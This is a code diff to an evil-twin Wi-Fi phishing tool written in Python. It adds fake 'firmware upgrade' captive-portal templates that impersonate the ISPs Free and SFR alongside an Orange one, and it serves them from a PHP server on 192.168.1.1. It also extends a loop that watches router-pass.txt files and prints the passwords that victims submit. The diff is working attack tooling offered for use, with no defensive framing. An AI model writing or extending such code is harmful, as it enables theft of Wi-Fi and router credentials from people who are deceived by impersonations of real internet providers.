@@ -293,6 +293,15 @@ def read_file(attack_type, template_type):
             with open("./ETwin-templates/orange-firmware-upgrade/router-pass.txt", "r") as f:
                 readFile_user = f.readlines()
             return readFile_user
+        elif template_type == "C":
+            with open("./ETwin-templates/free-firmware-upgrade/router-pass.txt", "r") as f:
+                readFile_user = f.readlines()
+            return readFile_user
+        elif template_type == "D":
+            with open("./ETwin-templates/sfr-firmware-upgrade/router-pass.txt", "r") as f:
+                readFile_user = f.readlines()
+            return readFile_user
+        
     else:
         with open("./ETwin-templates/orange-firmware-upgrade/router-pass.txt", "r") as f:
             readFile_user = f.readlines()
@@ -325,6 +334,32 @@ def getCredentials(attack_type, template_type):
                     print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
                     initial_2fa = current_2fa
         elif template_type == "B":
+            initial_user = read_file(attack_type, template_type)
+            while True:
+                current_user = read_file(attack_type, template_type)
+                if initial_user != current_user:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                    print(Fore.WHITE)
+                    for line in current_user:
+                        print(line)
+                    print(Fore.WHITE)
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+
+                    initial_user = current_user
+        elif template_type == "C":
+            initial_user = read_file(attack_type, template_type)
+            while True:
+                current_user = read_file(attack_type, template_type)
+                if initial_user != current_user:
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+                    print(Fore.WHITE)
+                    for line in current_user:
+                        print(line)
+                    print(Fore.WHITE)
+                    print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' --------------------------------------------'}")
+
+                    initial_user = current_user
+        elif template_type == "D":
             initial_user = read_file(attack_type, template_type)
             while True:
                 current_user = read_file(attack_type, template_type)
@@ -572,10 +607,17 @@ def attack_func(network_interface, attack_mode):
                 verify_option = False
 
         if get_attack_type == "A":
+            
+            while (True):
+                get_colours(f"\t[A] Basic Mode", "blue")
+                get_colours(f"\t[B] Orange", "blue")
+                get_colours(f"\t[C] Free", "blue")
+                get_colours(f"\t[D] SFR", "blue")
+                template_type = input(Fore.YELLOW + "Options (A/B/C/D): " + Fore.WHITE)
 
-            get_colours(f"\t[A] Basic Mode", "blue")
-            get_colours(f"\t[B] Firmware Update", "blue")
-            template_type = input(Fore.YELLOW + "Options (A/B): " + Fore.WHITE)
+                if template_type in ["A", "B", "C", "D"]:
+                    break
+
 
 
 
@@ -616,10 +658,15 @@ def attack_func(network_interface, attack_mode):
             time.sleep(3)
             print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
 
-            if template_type == "B":
-                php_server = os.system(f"cd ETwin-templates/orange-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
-            elif template_type == "A":
+            if template_type == "A":
                 php_server = os.system(f"cd ETwin-templates/login-temp;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            elif template_type == "B":
+                php_server = os.system(f"cd ETwin-templates/orange-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            elif template_type == "C":
+                php_server = os.system(f"cd ETwin-templates/free-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            elif template_type == "D":
+                php_server = os.system(f"cd ETwin-templates/sfr-firmware-upgrade;xterm -hold -e sudo php -S 192.168.1.1:80 &")
+            
 
 
             print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Waiting for Credentials..'}")
